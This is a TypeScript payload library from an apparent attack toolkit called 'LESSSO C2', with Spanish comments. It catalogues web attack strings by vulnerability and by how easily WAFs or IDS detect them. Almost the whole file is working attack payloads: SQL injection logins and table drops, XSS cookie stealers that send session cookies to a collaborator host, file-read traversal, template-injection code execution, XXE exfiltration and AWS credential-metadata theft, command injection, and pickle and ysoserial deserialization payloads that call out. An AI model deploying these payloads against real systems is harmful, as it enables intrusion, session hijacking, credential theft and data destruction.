// ==========================================================
// LESSSO C2 — Dataset de Payloads por Vulnerabilidad
// ----------------------------------------------------------
// Payloads categorizados por tipo de vuln para pentesting web.
// Cada payload tiene un nivel de "ruido" que indica si es
// detectable fácilmente por WAFs/IDS.
//
// Placeholders:
//   {TARGET}  → URL o IP del objetivo
//   {PARAM}   → nombre del parámetro vulnerable
//   {COLLAB}  → dominio de collaborator (Burp Collaborator, interactsh, etc.)
// ==========================================================

export type VulnCategory =
  | 'sqli'
  | 'xss'
  | 'lfi'
  | 'rfi'
  | 'ssti'
  | 'xxe'
  | 'ssrf'
  | 'cmdi'
  | 'nosqli'
  | 'ldapi'
  | 'crlf'
  | 'openredirect'
  | 'prototype'
  | 'deserialization';

export type NoiseLevel = 'stealth' | 'normal' | 'noisy';

export interface VulnPayload {
  id: string;
  name: string;
  category: VulnCategory;
  noise: NoiseLevel;
  payload: string;
  description?: string;
  context?: string;      // Dónde se usa: URL, POST body, header, etc.
  tags?: string[];
}

// ==========================================================
// SQL INJECTION
// ==========================================================
const SQLI: VulnPayload[] = [
  {
    id: 'sqli-auth-bypass-classic',
    name: 'Auth Bypass (clásico)',
    category: 'sqli',
    noise: 'noisy',
    payload: `' OR '1'='1`,
    context: 'Login / parámetro de auth',
    tags: ['auth', 'bypass', 'union'],
  },
  {
    id: 'sqli-auth-bypass-comment',
    name: 'Auth Bypass (con comentario)',
    category: 'sqli',
    noise: 'noisy',
    payload: `' OR 1=1-- -`,
    context: 'Login / parámetro de auth',
    tags: ['auth', 'bypass', 'comment'],
  },
  {
    id: 'sqli-union-null',
    name: 'UNION SELECT NULL',
    category: 'sqli',
    noise: 'noisy',
    payload: `' UNION SELECT NULL-- -`,
    description: 'Aumenta el número de NULL hasta que el número de columnas coincida.',
    tags: ['union', 'columns'],
  },
  {
    id: 'sqli-union-detect-columns',
    name: 'Detección de columnas',
    category: 'sqli',
    noise: 'noisy',
    payload: `' ORDER BY 1-- -`,
    description: 'Incrementa el número hasta que dé error. Ese número - 1 es el total de columnas.',
    tags: ['union', 'columns', 'order-by'],
  },
  {
    id: 'sqli-union-data',
    name: 'UNION SELECT (datos)',
    category: 'sqli',
    noise: 'noisy',
    payload: `' UNION SELECT username,password FROM users-- -`,
    description: 'Ajusta el número y orden de columnas.',
    tags: ['union', 'dump'],
  },
  {
    id: 'sqli-error-based',
    name: 'Error-Based (MySQL)',
    category: 'sqli',
    noise: 'normal',
    payload: `' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -`,
    description: 'Extrae datos vía mensajes de error en MySQL/MariaDB.',
    tags: ['error', 'mysql'],
  },
  {
    id: 'sqli-error-based-pg',
    name: 'Error-Based (PostgreSQL)',
    category: 'sqli',
    noise: 'normal',
    payload: `' AND 1=CAST((SELECT version()) AS int)-- -`,
    tags: ['error', 'postgres'],
  },
  {
    id: 'sqli-time-based-mysql',
    name: 'Time-Based (MySQL)',
    category: 'sqli',
    noise: 'stealth',
    payload: `' AND IF(1=1,SLEEP(5),0)-- -`,
    description: 'Útil cuando no hay output visible. Espera 5s si la inyección es válida.',
    tags: ['blind', 'time-based', 'mysql'],
  },
  {
    id: 'sqli-time-based-pg',
    name: 'Time-Based (PostgreSQL)',
    category: 'sqli',
    noise: 'stealth',
    payload: `' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -`,
    tags: ['blind', 'time-based', 'postgres'],
  },
  {
    id: 'sqli-time-based-mssql',
    name: 'Time-Based (MSSQL)',
    category: 'sqli',
    noise: 'stealth',
    payload: `'; WAITFOR DELAY '0:0:5'-- -`,
    tags: ['blind', 'time-based', 'mssql'],
  },
  {
    id: 'sqli-boolean-based',
    name: 'Boolean-Based (Blind)',
    category: 'sqli',
    noise: 'stealth',
    payload: `' AND SUBSTRING((SELECT version()),1,1)='5'-- -`,
    description: 'Combina con time-based para automatizar.',
    tags: ['blind', 'boolean'],
  },
  {
    id: 'sqli-oob-mysql',
    name: 'Out-of-Band (MySQL)',
    category: 'sqli',
    noise: 'stealth',
    payload: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{COLLAB}\\\\a'))-- -`,
    description: 'Requiere DNS exfiltration. Combina con interactsh.',
    tags: ['oob', 'dns', 'mysql'],
  },
  {
    id: 'sqli-stacked',
    name: 'Stacked Queries',
    category: 'sqli',
    noise: 'noisy',
    payload: `'; DROP TABLE users-- -`,
    description: 'Solo funciona si el driver permite múltiples queries (MSSQL, PostgreSQL algunas configs).',
    tags: ['stacked', 'ddl'],
  },
  {
    id: 'sqli-waf-bypass-case',
    name: 'WAF Bypass (case)',
    category: 'sqli',
    noise: 'normal',
    payload: `' UnIoN SeLeCt NULL-- -`,
    tags: ['waf-bypass', 'case'],
  },
  {
    id: 'sqli-waf-bypass-comment',
    name: 'WAF Bypass (comentarios inline)',
    category: 'sqli',
    noise: 'normal',
    payload: `'/**/UNION/**/SELECT/**/NULL-- -`,
    tags: ['waf-bypass', 'comment'],
  },
  {
    id: 'sqli-waf-bypass-encoding',
    name: 'WAF Bypass (URL encoding)',
    category: 'sqli',
    noise: 'normal',
    payload: `%27%20OR%201%3D1--%20-`,
    description: 'URL-encoded. Útil para WAFs que no decodifican antes de inspeccionar.',
    tags: ['waf-bypass', 'url-encoding'],
  },
];

// ==========================================================
// XSS
// ==========================================================
const XSS: VulnPayload[] = [
  {
    id: 'xss-basic-alert',
    name: 'Alerta básica',
    category: 'xss',
    noise: 'noisy',
    payload: `<script>alert(1)</script>`,
    context: 'Reflected / Stored',
    tags: ['basic', 'alert'],
  },
  {
    id: 'xss-img-onerror',
    name: 'IMG onerror',
    category: 'xss',
    noise: 'noisy',
    payload: `<img src=x onerror=alert(1)>`,
    description: 'Útil cuando <script> está filtrado.',
    tags: ['img', 'onerror'],
  },
  {
    id: 'xss-svg-onload',
    name: 'SVG onload',
    category: 'xss',
    noise: 'noisy',
    payload: `<svg onload=alert(1)>`,
    tags: ['svg', 'onload'],
  },
  {
    id: 'xss-body-onload',
    name: 'Body onload',
    category: 'xss',
    noise: 'noisy',
    payload: `<body onload=alert(1)>`,
    tags: ['body', 'onload'],
  },
  {
    id: 'xss-iframe-srcdoc',
    name: 'Iframe srcdoc',
    category: 'xss',
    noise: 'normal',
    payload: `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
    tags: ['iframe', 'srcdoc'],
  },
  {
    id: 'xss-details-ontoggle',
    name: 'Details ontoggle',
    category: 'xss',
    noise: 'noisy',
    payload: `<details open ontoggle=alert(1)>`,
    tags: ['details', 'ontoggle'],
  },
  {
    id: 'xss-cookie-stealer',
    name: 'Cookie Stealer',
    category: 'xss',
    noise: 'normal',
    payload: `<script>new Image().src="//{COLLAB}/?c="+document.cookie;</script>`,
    description: 'Exfiltra la cookie de sesión a un servidor controlado.',
    tags: ['cookie', 'exfil'],
  },
  {
    id: 'xss-fetch-stealer',
    name: 'Fetch Stealer',
    category: 'xss',
    noise: 'normal',
    payload: `<script>fetch('//{COLLAB}/?c='+btoa(document.cookie));</script>`,
    tags: ['cookie', 'exfil', 'fetch'],
  },
  {
    id: 'xss-polyglot-0x0',
    name: 'Polyglot 0x0',
    category: 'xss',
    noise: 'noisy',
    payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
    description: 'Polyglot de 0x0. Funciona en múltiples contextos (HTML, JS, atributo, comentario).',
    tags: ['polyglot', 'context-bypass'],
  },
  {
    id: 'xss-polyglot-hahwul',
    name: 'Polyglot Hahwul',
    category: 'xss',
    noise: 'noisy',
    payload: `"><img src=x onerror=alert(1)><svg/onload=alert(2)>`,
    tags: ['polyglot'],
  },
  {
    id: 'xss-blind-marker',
    name: 'Blind XSS Marker',
    category: 'xss',
    noise: 'normal',
    payload: `<script src="//{COLLAB}/xss.js"></script>`,
    description: 'Carga un JS remoto. Útil para Blind XSS.',
    tags: ['blind', 'remote-js'],
  },
  {
    id: 'xss-waf-bypass-uppercase',
    name: 'WAF Bypass (uppercase)',
    category: 'xss',
    noise: 'normal',
    payload: `<sCrIpT>alert(1)</sCrIpT>`,
    tags: ['waf-bypass', 'case'],
  },
  {
    id: 'xss-waf-bypass-null',
    name: 'WAF Bypass (null byte)',
    category: 'xss',
    noise: 'normal',
    payload: `<scri%00pt>alert(1)</scri%00pt>`,
    tags: ['waf-bypass', 'null-byte'],
  },
  {
    id: 'xss-dom-location',
    name: 'DOM-based (location)',
    category: 'xss',
    noise: 'normal',
    payload: `#<img src=x onerror=alert(1)>`,
    description: 'Útil cuando el sink es `document.location.hash`.',
    tags: ['dom', 'location'],
  },
];

// ==========================================================
// LFI / RFI / PATH TRAVERSAL
// ==========================================================
const LFI: VulnPayload[] = [
  {
    id: 'lfi-basic-linux',
    name: 'LFI básico (Linux)',
    category: 'lfi',
    noise: 'noisy',
    payload: `../../../../etc/passwd`,
    tags: ['path-traversal', 'linux'],
  },
  {
    id: 'lfi-basic-windows',
    name: 'LFI básico (Windows)',
    category: 'lfi',
    noise: 'noisy',
    payload: `..\\..\\..\\..\\windows\\win.ini`,
    tags: ['path-traversal', 'windows'],
  },
  {
    id: 'lfi-encoded-url',
    name: 'LFI URL-encoded',
    category: 'lfi',
    noise: 'normal',
    payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
    tags: ['encoding', 'waf-bypass'],
  },
  {
    id: 'lfi-double-encoded',
    name: 'LFI Double-encoded',
    category: 'lfi',
    noise: 'normal',
    payload: `%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
    tags: ['encoding', 'waf-bypass'],
  },
  {
    id: 'lfi-null-byte',
    name: 'LFI Null byte',
    category: 'lfi',
    noise: 'normal',
    payload: `../../../../etc/passwd%00`,
    description: 'Funciona en PHP < 5.3.4.',
    tags: ['null-byte', 'php'],
  },
  {
    id: 'lfi-php-filter',
    name: 'PHP Filter Chain',
    category: 'lfi',
    noise: 'stealth',
    payload: `php://filter/convert.base64-encode/resource=index.php`,
    description: 'Lee código fuente PHP via base64.',
    tags: ['php', 'filter'],
  },
  {
    id: 'lfi-php-input',
    name: 'PHP Input',
    category: 'lfi',
    noise: 'noisy',
    payload: `php://input`,
    description: 'Ejecuta código desde el body de la request.',
    tags: ['php', 'input'],
  },
  {
    id: 'lfi-proc-self-environ',
    name: '/proc/self/environ',
    category: 'lfi',
    noise: 'normal',
    payload: `../../../../proc/self/environ`,
    description: 'Contiene variables de entorno. Puede incluir User-Agent si es CGI.',
    tags: ['linux', 'proc'],
  },
  {
    id: 'lfi-log-poisoning',
    name: 'Log Poisoning (Apache)',
    category: 'lfi',
    noise: 'normal',
    payload: `../../../../var/log/apache2/access.log`,
    description: 'Combina con User-Agent malicioso. El payload RCE se ejecuta al leer el log.',
    tags: ['log-poisoning', 'apache'],
  },
  {
    id: 'lfi-ssh-log',
    name: 'Log Poisoning (SSH)',
    category: 'lfi',
    noise: 'normal',
    payload: `../../../../var/log/auth.log`,
    description: 'Combina con intento de login SSH con username PHP malicioso.',
    tags: ['log-poisoning', 'ssh'],
  },
  {
    id: 'rfi-basic',
    name: 'RFI básico',
    category: 'rfi',
    noise: 'noisy',
    payload: `http://{COLLAB}/shell.txt`,
    description: 'El shell.txt debe contener el payload PHP. Requiere allow_url_include=On.',
    tags: ['rfi', 'php'],
  },
  {
    id: 'lfi-proc-cmdline',
    name: '/proc/cmdline',
    category: 'lfi',
    noise: 'normal',
    payload: `../../../../proc/self/cmdline`,
    tags: ['linux', 'proc'],
  },
];

// ==========================================================
// SSTI
// ==========================================================

const SSTI: VulnPayload[] = [
  {
    id: 'ssti-detect-arithmetic',
    name: 'Detección aritmética',
    category: 'ssti',
    noise: 'normal',
    payload: '{{7*7}}',
    description: 'Si el output es 49, hay SSTI. Prueba con ${7*7}, #{7*7}, <%= 7*7 %> para identificar el motor.',
    tags: ['detection'],
  },
  {
    id: 'ssti-detect-jinja',
    name: 'Detección Jinja2 / Twig',
    category: 'ssti',
    noise: 'normal',
    payload: "{{7*'7'}}",
    description: 'Jinja2 devuelve 7777777, Twig devuelve 49.',
    tags: ['detection', 'jinja2', 'twig'],
  },
  {
    id: 'ssti-jinja-rce',
    name: 'Jinja2 RCE',
    category: 'ssti',
    noise: 'normal',
    payload: "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
    tags: ['jinja2', 'rce', 'python'],
  },
  {
    id: 'ssti-jinja-rce-2',
    name: 'Jinja2 RCE (lipsum)',
    category: 'ssti',
    noise: 'normal',
    payload: '{{ lipsum.__globals__["os"].popen("id").read() }}',
    tags: ['jinja2', 'rce', 'python'],
  },
  {
    id: 'ssti-jinja-config',
    name: 'Jinja2 dump config',
    category: 'ssti',
    noise: 'normal',
    payload: '{{ config.items() }}',
    description: 'Exfiltra la configuración de Flask (incluye SECRET_KEY).',
    tags: ['jinja2', 'info-disclosure'],
  },
  {
    id: 'ssti-twig-rce',
    name: 'Twig RCE',
    category: 'ssti',
    noise: 'normal',
    payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    description: 'Funciona en Twig < 1.20 / < 2.5.',
    tags: ['twig', 'rce', 'php'],
  },
  {
    id: 'ssti-freemarker-rce',
    name: 'Freemarker RCE',
    category: 'ssti',
    noise: 'normal',
    payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
    description: 'El `${ ex("id") }` es parte del payload de Freemarker, no interpolación.',
    tags: ['freemarker', 'rce', 'java'],
  },
  {
    id: 'ssti-velocity-rce',
    name: 'Velocity RCE',
    category: 'ssti',
    noise: 'normal',
    payload: '#set($e="e")#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))',
    tags: ['velocity', 'rce', 'java'],
  },
  {
    id: 'ssti-erb-rce',
    name: 'ERB (Ruby) RCE',
    category: 'ssti',
    noise: 'normal',
    payload: '<%= system("id") %>',
    tags: ['erb', 'rce', 'ruby'],
  },
  {
    id: 'ssti-smarty-rce',
    name: 'Smarty RCE',
    category: 'ssti',
    noise: 'normal',
    payload: "{php}system('id');{/php}",
    description: 'Smarty < 3.1.30.',
    tags: ['smarty', 'rce', 'php'],
  },
  {
    id: 'ssti-mako-rce',
    name: 'Mako RCE',
    category: 'ssti',
    noise: 'normal',
    payload: "<%import os%>${os.popen('id').read()}",
    description: 'El `${os.popen(...)}` es parte del payload de Mako, no interpolación.',
    tags: ['mako', 'rce', 'python'],
  },
];

// ==========================================================
// XXE / SSRF
// ==========================================================
const XXE: VulnPayload[] = [
  {
    id: 'xxe-basic-file',
    name: 'XXE — Lectura de archivo',
    category: 'xxe',
    noise: 'normal',
    payload: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>`,
    tags: ['file-read'],
  },
  {
    id: 'xxe-basic-windows',
    name: 'XXE — File read (Windows)',
    category: 'xxe',
    noise: 'normal',
    payload: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<root>&xxe;</root>`,
    tags: ['file-read', 'windows'],
  },
  {
    id: 'xxe-oob',
    name: 'XXE — Out-of-Band',
    category: 'xxe',
    noise: 'normal',
    payload: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://{COLLAB}/evil.dtd">\n  %xxe;\n]>\n<root>&content;</root>`,
    description: 'evil.dtd contiene: <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{COLLAB}/?x=%file;\'>"> %eval; %exfil;',
    tags: ['oob', 'file-read'],
  },
  {
    id: 'xxe-billion-laughs',
    name: 'XXE — Billion Laughs (DoS)',
    category: 'xxe',
    noise: 'noisy',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n]>\n<lolz>&lol3;</lolz>`,
    description: 'Bomba de expansión XML. Usar solo en entornos de prueba.',
    tags: ['dos'],
  },
  {
    id: 'xxe-ssrf-aws',
    name: 'XXE — SSRF (AWS metadata)',
    category: 'xxe',
    noise: 'normal',
    payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n]>\n<root>&xxe;</root>`,
    tags: ['ssrf', 'cloud', 'aws'],
  },
];

// ==========================================================
// COMMAND INJECTION
// ==========================================================
const CMDI: VulnPayload[] = [
  {
    id: 'cmdi-semicolon',
    name: 'Command Injection — `;`',
    category: 'cmdi',
    noise: 'noisy',
    payload: `; id`,
    tags: ['shell-meta'],
  },
  {
    id: 'cmdi-ampersand',
    name: 'Command Injection — `&`',
    category: 'cmdi',
    noise: 'noisy',
    payload: `& whoami`,
    tags: ['shell-meta'],
  },
  {
    id: 'cmdi-pipe',
    name: 'Command Injection — `|`',
    category: 'cmdi',
    noise: 'noisy',
    payload: `| id`,
    tags: ['shell-meta'],
  },
  {
    id: 'cmdi-backtick',
    name: 'Command Injection — backtick',
    category: 'cmdi',
    noise: 'noisy',
    payload: '`id`',
    tags: ['shell-meta'],
  },
  {
    id: 'cmdi-dollar',
    name: 'Command Injection — `$()`',
    category: 'cmdi',
    noise: 'noisy',
    payload: `$(id)`,
    tags: ['shell-meta'],
  },
  {
    id: 'cmdi-blind-oob',
    name: 'Command Injection — OOB',
    category: 'cmdi',
    noise: 'stealth',
    payload: `; nslookup {COLLAB}`,
    description: 'Útil cuando no hay output visible.',
    tags: ['oob', 'dns'],
  },
  {
    id: 'cmdi-blind-time',
    name: 'Command Injection — Time-based',
    category: 'cmdi',
    noise: 'stealth',
    payload: `; sleep 10`,
    description: 'Si tarda 10s, hay inyección ciega.',
    tags: ['blind', 'time-based'],
  },
  {
    id: 'cmdi-waf-bypass-ifs',
    name: 'WAF Bypass — IFS',
    category: 'cmdi',
    noise: 'normal',
    payload: `;cat$IFS/etc/passwd`,
    description: 'IFS sustituye al espacio. Bypass de filtros de espacios.',
    tags: ['waf-bypass', 'ifs'],
  },
  {
    id: 'cmdi-waf-bypass-base64',
    name: 'WAF Bypass — Base64',
    category: 'cmdi',
    noise: 'normal',
    payload: `;echo aWQ=|base64 -d|sh`,
    description: 'aWQ= es "id" en base64. Útil para bypass de listas negras.',
    tags: ['waf-bypass', 'base64'],
  },
];

// ==========================================================
// NOSQL INJECTION
// ==========================================================
const NOSQLI: VulnPayload[] = [
  {
    id: 'nosqli-auth-bypass',
    name: 'NoSQL — Auth Bypass ($ne)',
    category: 'nosqli',
    noise: 'normal',
    payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`,
    description: 'Bypass de autenticación en MongoDB.',
    tags: ['mongo', 'auth-bypass'],
  },
  {
    id: 'nosqli-regex',
    name: 'NoSQL — Regex',
    category: 'nosqli',
    noise: 'normal',
    payload: `{"username": "admin", "password": {"$regex": "^.*"}}`,
    tags: ['mongo', 'regex'],
  },
  {
    id: 'nosqli-where',
    name: 'NoSQL — $where',
    category: 'nosqli',
    noise: 'noisy',
    payload: `{"$where": "sleep(5000)"}`,
    description: 'JavaScript execution en MongoDB. Requiere $where habilitado.',
    tags: ['mongo', 'js-exec'],
  },
  {
    id: 'nosqli-js',
    name: 'NoSQL — JS Injection',
    category: 'nosqli',
    noise: 'noisy',
    payload: `'; return true; var foo='`,
    tags: ['mongo', 'js-exec'],
  },
];

// ==========================================================
// LDAP INJECTION
// ==========================================================
const LDAPI: VulnPayload[] = [
  {
    id: 'ldapi-auth-bypass',
    name: 'LDAP — Auth Bypass',
    category: 'ldapi',
    noise: 'normal',
    payload: `*)(uid=*))(|(uid=*`,
    description: 'Bypass de autenticación LDAP.',
    tags: ['auth-bypass'],
  },
  {
    id: 'ldapi-wildcard',
    name: 'LDAP — Wildcard',
    category: 'ldapi',
    noise: 'normal',
    payload: `*`,
    tags: ['wildcard'],
  },
  {
    id: 'ldapi-null',
    name: 'LDAP — Null byte',
    category: 'ldapi',
    noise: 'normal',
    payload: `admin)(&(password=*))%00`,
    tags: ['null-byte'],
  },
];

// ==========================================================
// CRLF INJECTION
// ==========================================================
const CRLF: VulnPayload[] = [
  {
    id: 'crlf-basic',
    name: 'CRLF — Basic',
    category: 'crlf',
    noise: 'normal',
    payload: `%0d%0aInjected-Header: value`,
    tags: ['header-injection'],
  },
  {
    id: 'crlf-response-split',
    name: 'CRLF — Response Splitting',
    category: 'crlf',
    noise: 'normal',
    payload: `%0d%0a%0d%0a<html>Injected</html>`,
    tags: ['response-split'],
  },
  {
    id: 'crlf-double-encoded',
    name: 'CRLF — Double-encoded',
    category: 'crlf',
    noise: 'normal',
    payload: `%250d%250aInjected-Header: value`,
    tags: ['encoding', 'waf-bypass'],
  },
];

// ==========================================================
// OPEN REDIRECT
// ==========================================================
const OPEN_REDIRECT: VulnPayload[] = [
  {
    id: 'openredirect-basic',
    name: 'Open Redirect — Basic',
    category: 'openredirect',
    noise: 'noisy',
    payload: `https://evil.com`,
    tags: ['basic'],
  },
  {
    id: 'openredirect-protocol-relative',
    name: 'Open Redirect — Protocol-relative',
    category: 'openredirect',
    noise: 'normal',
    payload: `//evil.com`,
    tags: ['bypass'],
  },
  {
    id: 'openredirect-at',
    name: 'Open Redirect — @ bypass',
    category: 'openredirect',
    noise: 'normal',
    payload: `https://target.com@evil.com`,
    tags: ['bypass'],
  },
  {
    id: 'openredirect-backslash',
    name: 'Open Redirect — Backslash',
    category: 'openredirect',
    noise: 'normal',
    payload: `https://evil.com\\@target.com`,
    tags: ['bypass'],
  },
  {
    id: 'openredirect-encoded',
    name: 'Open Redirect — URL-encoded',
    category: 'openredirect',
    noise: 'normal',
    payload: `%2f%2fevil.com`,
    tags: ['encoding'],
  },
];

// ==========================================================
// PROTOTYPE POLLUTION
// ==========================================================
const PROTOTYPE: VulnPayload[] = [
  {
    id: 'prototype-basic',
    name: 'Prototype Pollution — Basic',
    category: 'prototype',
    noise: 'normal',
    payload: `__proto__[polluted]=yes`,
    tags: ['nodejs'],
  },
  {
    id: 'prototype-constructor',
    name: 'Prototype Pollution — Constructor',
    category: 'prototype',
    noise: 'normal',
    payload: `constructor[prototype][polluted]=yes`,
    tags: ['nodejs'],
  },
  {
    id: 'prototype-json',
    name: 'Prototype Pollution — JSON',
    category: 'prototype',
    noise: 'normal',
    payload: `{"__proto__": {"polluted": "yes"}}`,
    context: 'POST body',
    tags: ['json', 'nodejs'],
  },
];

// ==========================================================
// DESERIALIZATION
// ==========================================================
const DESERIALIZATION: VulnPayload[] = [
  {
    id: 'deser-java-ysoserial',
    name: 'Java Deserialization (ysoserial)',
    category: 'deserialization',
    noise: 'noisy',
    payload: `java -jar ysoserial.jar CommonsCollections1 'curl {COLLAB}/pwned' > payload.bin`,
    description: 'Genera payload binario. Envíalo al endpoint vulnerable.',
    tags: ['java', 'ysoserial'],
  },
  {
    id: 'deser-php',
    name: 'PHP Deserialization',
    category: 'deserialization',
    noise: 'noisy',
    payload: `O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}`,
    description: 'Payload PHP serializado. Requiere una clase con __wakeup / __destruct vulnerable.',
    tags: ['php'],
  },
  {
    id: 'deser-python-pickle',
    name: 'Python Pickle',
    category: 'deserialization',
    noise: 'noisy',
    payload: `python3 -c 'import pickle,os; class P: \\n  def __reduce__(self): return (os.system,("curl {COLLAB}",))\\nprint(pickle.dumps(P()))' > payload.pkl`,
    description: 'Genera un pickle con RCE.',
    tags: ['python', 'pickle'],
  },
];

// ==========================================================
// EXPORTS
// ==========================================================
export const VULN_PAYLOADS: VulnPayload[] = [
  ...SQLI,
  ...XSS,
  ...LFI,
  ...SSTI,
  ...XXE,
  ...CMDI,
  ...NOSQLI,
  ...LDAPI,
  ...CRLF,
  ...OPEN_REDIRECT,
  ...PROTOTYPE,
  ...DESERIALIZATION,
];

// Metadata para UI
export const VULN_CATEGORIES: Record<VulnCategory, { label: string; icon: string; color: string }> = {
  sqli:           { label: 'SQL Injection',          icon: '💉', color: 'red' },
  xss:            { label: 'Cross-Site Scripting',   icon: '🌐', color: 'orange' },
  lfi:            { label: 'Local File Inclusion',   icon: '📁', color: 'yellow' },
  rfi:            { label: 'Remote File Inclusion',  icon: '🌍', color: 'yellow' },
  ssti:           { label: 'Server-Side Template',   icon: '📝', color: 'purple' },
  xxe:            { label: 'XML External Entity',    icon: '📄', color: 'pink' },
  ssrf:           { label: 'Server-Side Request Forgery', icon: '🔀', color: 'indigo' },
  cmdi:           { label: 'Command Injection',      icon: '💻', color: 'rose' },
  nosqli:         { label: 'NoSQL Injection',        icon: '🍃', color: 'green' },
  ldapi:          { label: 'LDAP Injection',         icon: '🗂', color: 'cyan' },
  crlf:           { label: 'CRLF Injection',         icon: '↵', color: 'slate' },
  openredirect:   { label: 'Open Redirect',          icon: '↪', color: 'blue' },
  prototype:      { label: 'Prototype Pollution',    icon: '🧬', color: 'violet' },
  deserialization:{ label: 'Deserialization',        icon: '📦', color: 'amber' },
};

// Utilidad: filtrar por categoría
export function filterByCategory(category: VulnCategory | 'all'): VulnPayload[] {
  if (category === 'all') return VULN_PAYLOADS;
  return VULN_PAYLOADS.filter(p => p.category === category);
}

// Utilidad: filtrar por nivel de ruido
export function filterByNoise(noise: NoiseLevel | 'all'): VulnPayload[] {
  if (noise === 'all') return VULN_PAYLOADS;
  return VULN_PAYLOADS.filter(p => p.noise === noise);
}

// Utilidad: búsqueda
export function searchVulnPayloads(query: string): VulnPayload[] {
  const q = query.toLowerCase();
  return VULN_PAYLOADS.filter(p =>
    p.name.toLowerCase().includes(q) ||
    p.payload.toLowerCase().includes(q) ||
    (p.tags || []).some(t => t.toLowerCase().includes(q)) ||
    (p.description && p.description.toLowerCase().includes(q))
  );
}

// Utilidad: renderizar payload con placeholders
export function renderVulnPayload(p: VulnPayload, vars: Record<string, string>): string {
  let out = p.payload;
  for (const [key, value] of Object.entries(vars)) {
    out = out.replace(new RegExp(`\\{${key}\\}`, 'g'), value);
  }
  return out;
}
